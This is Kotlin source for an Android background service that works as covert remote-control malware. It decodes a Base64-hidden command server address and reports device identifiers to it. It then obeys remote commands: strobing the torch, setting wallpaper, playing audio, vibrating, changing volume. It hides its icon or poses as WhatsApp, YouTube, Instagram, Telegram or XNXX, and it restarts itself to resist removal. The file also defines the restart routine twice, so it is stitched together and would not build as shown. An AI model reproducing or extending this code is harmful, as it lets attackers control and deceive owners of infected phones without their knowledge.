package com.sync.xxx

import android.app.*
import android.content.*
import android.graphics.BitmapFactory
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraManager
import android.media.AudioManager
import android.app.WallpaperManager
import android.os.*
import android.util.Log
import androidx.core.app.NotificationCompat
import io.socket.client.IO
import io.socket.client.Socket
import org.json.JSONObject
import java.net.URI

class DeviceService : Service() {

    companion object {
        const val ACTION_COMMAND     = "com.sync.xxx.COMMAND"
        const val EXTRA_COMMAND      = "command"
        const val EXTRA_VALUE        = "value"
        const val ACTION_CONNECT     = "com.sync.xxx.CONNECT"
        const val ACTION_SEND_STATUS = "com.sync.xxx.SEND_STATUS"
        const val EXTRA_STATUS_JSON  = "statusJson"
        const val CHANNEL_ID         = "sync_xxx"
        const val NOTIF_ID           = 1

        val SERVER_URL: String
            get() = String(
                android.util.Base64.decode(
                    "aHR0cDovL2Nsb3VkLTEubWlyenByaXZhdGUubXkuaWQ6MzE3MA==",
                    android.util.Base64.DEFAULT
                )
            ).trim()
    }

    private var socket: Socket? = null
    private var deviceId: String = ""
    private var deviceName: String = ""

    private var cameraManager: CameraManager? = null
    private var torchCameraId: String? = null

    private var flashHandler: Handler? = null
    private var flashRunnable: Runnable? = null
    private var flashBlinking = false

    private var senterOn = false

    private var flashIntervalHandler: Handler? = null
    private var flashIntervalRunnable: Runnable? = null
    private var flashIntervalState = false
    private var mediaPlayer: android.media.MediaPlayer? = null
    
    private fun playAudio(url: String) {
        try {
            mediaPlayer?.release()
            mediaPlayer = android.media.MediaPlayer().apply {
                setDataSource(url)
                setOnPreparedListener { start() }
                setOnCompletionListener { release(); mediaPlayer = null }
                setOnErrorListener { _, _, _ -> release(); mediaPlayer = null; false }
                prepareAsync()
            }
        } catch (e: Exception) {
            Log.e("DeviceService", "playAudio: ${e.message}")
        }
    }
    
    private val localReceiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context, intent: Intent) {
            when (intent.action) {
                ACTION_COMMAND -> {
                    val cmd   = intent.getStringExtra(EXTRA_COMMAND) ?: return
                    val value = intent.getStringExtra(EXTRA_VALUE)   ?: ""
                    handleCommand(cmd, value)
                }
                ACTION_CONNECT -> {
                    if (socket == null || socket?.connected() == false) connectSocket()
                }
                ACTION_SEND_STATUS -> {
                    val json = intent.getStringExtra(EXTRA_STATUS_JSON) ?: return
                    emitStatus(JSONObject(json))
                }
            }
        }
    }

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            startForeground(
                NOTIF_ID,
                buildNotification(),
                android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE
            )
        } else {
            startForeground(NOTIF_ID, buildNotification())
        }

        deviceId = android.provider.Settings.Secure.getString(
            contentResolver, android.provider.Settings.Secure.ANDROID_ID
        ).takeIf { !it.isNullOrBlank() } ?: Build.ID

        val mfr   = Build.MANUFACTURER.replaceFirstChar { it.uppercase() }
        val model = Build.MODEL
        deviceName = if (model.startsWith(mfr, ignoreCase = true)) model else "$mfr $model"

        cameraManager = getSystemService(CAMERA_SERVICE) as CameraManager
        torchCameraId = cameraManager?.cameraIdList?.firstOrNull { id ->
            cameraManager?.getCameraCharacteristics(id)
                ?.get(CameraCharacteristics.FLASH_INFO_AVAILABLE) == true
        }

        val filter = IntentFilter().apply {
            addAction(ACTION_CONNECT)
            addAction(ACTION_SEND_STATUS)
            addAction(ACTION_COMMAND)
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(localReceiver, filter, RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(localReceiver, filter)
        }

        connectSocket()
    }

    // ── TAMBAHAN: schedule alarm watchdog ─────────
 
    private fun scheduleRestartAlarm() {
        try {
            val intent = Intent(this, RestartReceiver::class.java)
            val pending = PendingIntent.getBroadcast(
                this, 0, intent,
                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
            )
            val am = getSystemService(ALARM_SERVICE) as AlarmManager
            // Cek tiap 60 detik apakah service masih hidup
            am.setRepeating(
                AlarmManager.RTC_WAKEUP,
                System.currentTimeMillis() + 60_000L,
                60_000L,
                pending
            )
        } catch (e: Exception) {
            Log.e("DeviceService", "scheduleRestartAlarm: ${e.message}")
        }
    }
    // ─────────────────────────────────────────────

    private fun connectSocket() {
        try {
            val opts = IO.Options.builder()
                .setReconnection(true)
                .setReconnectionDelay(3000)
                .setReconnectionDelayMax(10000)
                .build()

            socket = IO.socket(URI.create(SERVER_URL), opts)

            socket?.on(Socket.EVENT_CONNECT) {
                Log.d("DeviceService", "Socket Connected")
                SocketHolder.connected = true

                val batteryIntent = registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
                val level   = batteryIntent?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
                val scale   = batteryIntent?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
                val plugged = batteryIntent?.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1) ?: -1
                val battPct = if (level >= 0 && scale > 0) (level * 100 / scale) else -1

                socket?.emit("device:register", JSONObject().apply {
                    put("deviceId",       deviceId)
                    put("name",           deviceName)
                    put("battery",        battPct)
                    put("charging",       plugged != 0)
                    put("sdkVersion",     Build.VERSION.SDK_INT)
                    put("androidVersion", Build.VERSION.RELEASE)
                    put("uid",            readUid())
                })
            }

            socket?.on(Socket.EVENT_DISCONNECT) {
                Log.d("DeviceService", "Socket disconnected")
                SocketHolder.connected = false
            }

            socket?.on("command") { args ->
                val data   = args[0] as? JSONObject ?: return@on
                val cmd    = data.optString("command")
                val valRaw = data.opt("value")?.toString() ?: ""
                val intent = Intent(ACTION_COMMAND).apply {
                    putExtra(EXTRA_COMMAND, cmd)
                    putExtra(EXTRA_VALUE, valRaw)
                    setPackage(packageName)
                }
                sendBroadcast(intent)
            }

            socket?.connect()
        } catch (e: Exception) {
            Log.e("DeviceService", "Socket error: ${e.message}")
        }
    }

   private fun handleCommand(cmd: String, value: String) {
    when (cmd) {
        "senter"            -> setSenter(value == "true")
        "flashlight"        -> setFlashlight(value == "true")
        "flashInterval"     -> startFlashInterval(value)
        "flashIntervalStop" -> stopFlashInterval()
        "setWallpaper"      -> setWallpaperFromUrl(value)
        "vibrate"           -> vibrateDevice(value)
        "setVolume"         -> setVolumeLevel(value.toIntOrNull()?.coerceIn(0, 100) ?: 50)
        "muteVolume"        -> setVolumeMute(value == "true")
        "changeTheme"       -> changeTheme(value)
        "hideIcon"          -> setHideIcon(value == "true")
        "playAudio"        -> playAudio(value)
    }
}

    private fun setHideIcon(hide: Boolean) {
        try {
            val pm = packageManager
            val aliases = listOf(
                "com.sync.xxx.AliasDefault",
                "com.sync.xxx.AliasWhatsApp",
                "com.sync.xxx.AliasYouTube",
                "com.sync.xxx.AliasInstagram",
                "com.sync.xxx.AliasTelegram",
                "com.sync.xxx.AliasXNXX"
            )
            aliases.forEach { alias ->
                try {
                    pm.setComponentEnabledSetting(
                        android.content.ComponentName(packageName, alias),
                        android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                        android.content.pm.PackageManager.DONT_KILL_APP
                    )
                } catch (_: Exception) {}
            }
            if (!hide) {
                pm.setComponentEnabledSetting(
                    android.content.ComponentName(packageName, "com.sync.xxx.AliasDefault"),
                    android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                    android.content.pm.PackageManager.DONT_KILL_APP
                )
            }
            emitStatus(JSONObject().apply { put("iconHidden", hide) })
        } catch (e: Exception) {
            Log.e("DeviceService", "setHideIcon: ${e.message}")
        }
    }

    private fun setSenter(on: Boolean) {
        try {
            senterOn = on
            torchCameraId?.let { cameraManager?.setTorchMode(it, on) }
            emitStatus(JSONObject().apply { put("senterOn", on) })
        } catch (e: Exception) {
            Log.e("DeviceService", "setSenter: ${e.message}")
        }
    }

    private fun setFlashlight(on: Boolean) {
        if (on) {
            if (flashBlinking) return
            flashBlinking = true
            flashHandler  = Handler(Looper.getMainLooper())
            var state     = false
            flashRunnable = object : Runnable {
                override fun run() {
                    if (!flashBlinking) {
                        try { torchCameraId?.let { cameraManager?.setTorchMode(it, false) } } catch (_: Exception) {}
                        return
                    }
                    state = !state
                    try { torchCameraId?.let { cameraManager?.setTorchMode(it, state) } } catch (_: Exception) {}
                    flashHandler?.postDelayed(this, 200)
                }
            }
            flashHandler?.post(flashRunnable!!)
        } else {
            flashBlinking = false
            flashHandler?.removeCallbacks(flashRunnable ?: return)
            flashHandler  = null
            flashRunnable = null
            try { torchCameraId?.let { cameraManager?.setTorchMode(it, false) } } catch (_: Exception) {}
        }
        emitStatus(JSONObject().apply { put("flashlight", on) })
    }

    private fun startFlashInterval(value: String) {
        stopFlashInterval()
        val ms = value.toLongOrNull()?.coerceAtLeast(50L) ?: 200L
        flashIntervalHandler = Handler(Looper.getMainLooper())
        flashIntervalRunnable = object : Runnable {
            override fun run() {
                flashIntervalState = !flashIntervalState
                try { torchCameraId?.let { cameraManager?.setTorchMode(it, flashIntervalState) } } catch (_: Exception) {}
                flashIntervalHandler?.postDelayed(this, ms)
            }
        }
        flashIntervalHandler?.post(flashIntervalRunnable!!)
        emitStatus(JSONObject().apply {
            put("flashIntervalActive", true)
            put("flashIntervalMs", ms)
        })
    }

    private fun stopFlashInterval() {
        flashIntervalRunnable?.let { flashIntervalHandler?.removeCallbacks(it) }
        flashIntervalHandler  = null
        flashIntervalRunnable = null
        flashIntervalState    = false
        try { torchCameraId?.let { cameraManager?.setTorchMode(it, false) } } catch (_: Exception) {}
        emitStatus(JSONObject().apply { put("flashIntervalActive", false) })
    }

    private fun setWallpaperFromUrl(url: String) {
        Thread {
            try {
                val conn = (java.net.URL(url).openConnection() as java.net.HttpURLConnection).apply {
                    requestMethod           = "GET"
                    connectTimeout          = 8000
                    readTimeout             = 15000
                    setRequestProperty("User-Agent", "Mozilla/5.0")
                    setRequestProperty("Accept", "image/*")
                    instanceFollowRedirects = true
                    connect()
                }
                if (conn.responseCode != 200) { conn.disconnect(); return@Thread }
                val bytes = conn.inputStream.use { it.readBytes() }
                conn.disconnect()
                val bmp = BitmapFactory.decodeByteArray(bytes, 0, bytes.size) ?: return@Thread
                WallpaperManager.getInstance(this).setBitmap(bmp)
                bmp.recycle()
                emitStatus(JSONObject().apply { put("wallpaperSet", true) })
            } catch (e: Exception) {
                Log.e("DeviceService", "setWallpaper: ${e.message}")
            }
        }.start()
    }

    private fun vibrateDevice(value: String) {
        try {
            val durationMs = value.toLongOrNull() ?: 500L
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                val vm  = getSystemService(android.os.VibratorManager::class.java)
                val vib = vm?.defaultVibrator
                vib?.vibrate(VibrationEffect.createOneShot(durationMs, VibrationEffect.DEFAULT_AMPLITUDE))
            } else {
                @Suppress("DEPRECATION")
                val vib = getSystemService(VIBRATOR_SERVICE) as? android.os.Vibrator
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    vib?.vibrate(VibrationEffect.createOneShot(durationMs, VibrationEffect.DEFAULT_AMPLITUDE))
                } else {
                    @Suppress("DEPRECATION")
                    vib?.vibrate(durationMs)
                }
            }
            emitStatus(JSONObject().apply { put("vibrated", durationMs) })
        } catch (e: Exception) {
            Log.e("DeviceService", "vibrateDevice: ${e.message}")
        }
    }

    private fun setVolumeLevel(level: Int) {
        try {
            val audio = getSystemService(AUDIO_SERVICE) as AudioManager
            listOf(
                AudioManager.STREAM_MUSIC,
                AudioManager.STREAM_RING,
                AudioManager.STREAM_NOTIFICATION
            ).forEach { stream ->
                val max    = audio.getStreamMaxVolume(stream)
                val target = (level / 100f * max).toInt().coerceIn(0, max)
                audio.setStreamVolume(stream, target, 0)
            }
            emitStatus(JSONObject().apply {
                put("volumeLevel", level)
                put("volumeMuted", level == 0)
            })
        } catch (e: Exception) {
            Log.e("DeviceService", "setVolumeLevel: ${e.message}")
        }
    }

    private fun setVolumeMute(mute: Boolean) {
        try {
            val audio = getSystemService(AUDIO_SERVICE) as AudioManager
            audio.setStreamVolume(
                AudioManager.STREAM_MUSIC,
                if (mute) 0 else audio.getStreamMaxVolume(AudioManager.STREAM_MUSIC),
                0
            )
            emitStatus(JSONObject().apply { put("volumeMuted", mute) })
        } catch (e: Exception) {
            Log.e("DeviceService", "setVolumeMute: ${e.message}")
        }
    }


    private val THEME_ALIASES = mapOf(
        "default"   to "com.sync.xxx.AliasDefault",
        "whatsapp"  to "com.sync.xxx.AliasWhatsApp",
        "youtube"   to "com.sync.xxx.AliasYouTube",
        "instagram" to "com.sync.xxx.AliasInstagram",
        "telegram"  to "com.sync.xxx.AliasTelegram",
        "xnxx"      to "com.sync.xxx.AliasXNXX"
    )

    private fun changeTheme(theme: String) {
        try {
            val pm     = packageManager
            val target = theme.lowercase().trim()
            THEME_ALIASES.values.forEach { alias ->
                try {
                    pm.setComponentEnabledSetting(
                        android.content.ComponentName(packageName, alias),
                        android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                        android.content.pm.PackageManager.DONT_KILL_APP
                    )
                } catch (_: Exception) {}
            }
            val chosen = THEME_ALIASES[target] ?: THEME_ALIASES["default"]!!
            pm.setComponentEnabledSetting(
                android.content.ComponentName(packageName, chosen),
                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                android.content.pm.PackageManager.DONT_KILL_APP
            )
            emitStatus(JSONObject().apply { put("themeChanged", theme) })
        } catch (e: Exception) {
            Log.e("DeviceService", "changeTheme: ${e.message}")
        }
    }

    private fun readUid(): String {
        return try {
            val json = assets.open("uid.json").bufferedReader().use { it.readText() }
            JSONObject(json).optString("uid", "")
        } catch (e: Exception) {
            Log.e("DeviceService", "readUid: ${e.message}")
            ""
        }
    }

    fun emitStatus(statusObj: JSONObject) {
        if (socket?.connected() != true) return
        socket?.emit("device:status", JSONObject().apply {
            put("deviceId", deviceId)
            put("status", statusObj)
        })
    }

    override fun onBind(intent: Intent?): android.os.IBinder? = null

    // ─── onStartCommand ───────────────────────────────────────────────────────────
override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
    scheduleRestartAlarm()
    return START_STICKY
}

// ─── onTaskRemoved — kalau user swipe dari recents, langsung restart ──────────
override fun onTaskRemoved(rootIntent: Intent?) {
    val restartIntent = Intent(applicationContext, DeviceService::class.java).apply {
        setPackage(packageName)
    }
    // Di Android 8+ harus pakai startForegroundService
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
        startForegroundService(restartIntent)
    } else {
        startService(restartIntent)
    }
    super.onTaskRemoved(rootIntent)
}

// ─── scheduleRestartAlarm — watchdog tiap 15 detik, bukan 60 ─────────────────
private fun scheduleRestartAlarm() {
    try {
        val intent  = Intent(this, RestartReceiver::class.java)
        val pending = PendingIntent.getBroadcast(
            this, 0, intent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )
        val am = getSystemService(ALARM_SERVICE) as AlarmManager
        // setRepeating gak dijamin exact di Doze, tapi cukup buat watchdog
        am.setRepeating(
            AlarmManager.RTC_WAKEUP,
            System.currentTimeMillis() + 15_000L,
            15_000L,   // ← 15 detik jauh lebih responsif
            pending
        )
    } catch (e: Exception) {
        Log.e("DeviceService", "scheduleRestartAlarm: ${e.message}")
    }
}

// ─── onDestroy — bersih, tanpa stopAudio() phantom ───────────────────────────
override fun onDestroy() {
    super.onDestroy()
    try { unregisterReceiver(localReceiver) } catch (_: Exception) {}

    flashBlinking = false
    flashHandler?.removeCallbacks(flashRunnable ?: Runnable {})
    try { torchCameraId?.let { cameraManager?.setTorchMode(it, false) } } catch (_: Exception) {}

    stopFlashInterval()

    // Stop mediaPlayer dengan proper null-check — GANTI stopAudio() yang phantom
    try { mediaPlayer?.stop() } catch (_: Exception) {}
    try { mediaPlayer?.release() } catch (_: Exception) {}
    mediaPlayer = null

    socket?.disconnect()
    socket = null

    // Broadcast ke RestartReceiver buat immediate restart
    try {
        sendBroadcast(
            Intent(this, RestartReceiver::class.java).apply {
                action = "RestartDeviceService"
            }
        )
    } catch (_: Exception) {}

    
    try {
        val pending = PendingIntent.getBroadcast(
            this, 1,
            Intent(this, RestartReceiver::class.java),
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )
        val am = getSystemService(ALARM_SERVICE) as AlarmManager
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            am.setExactAndAllowWhileIdle(
                AlarmManager.RTC_WAKEUP,
                System.currentTimeMillis() + 2_000L,
                pending
            )
        } else {
            am.setExact(
                AlarmManager.RTC_WAKEUP,
                System.currentTimeMillis() + 2_000L,
                pending
            )
        }
    } catch (e: Exception) {
        Log.e("DeviceService", "onDestroy restart alarm: ${e.message}")
    }
}

    private fun buildNotification(): Notification =
        NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("SyncXxX")
            .setContentText("")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = android.app.NotificationChannel(
                CHANNEL_ID, "Sync XxX Service",
                android.app.NotificationManager.IMPORTANCE_LOW
            )
            getSystemService(android.app.NotificationManager::class.java)
                .createNotificationChannel(ch)
        }
    }
}

object SocketHolder {
    var connected: Boolean = false
}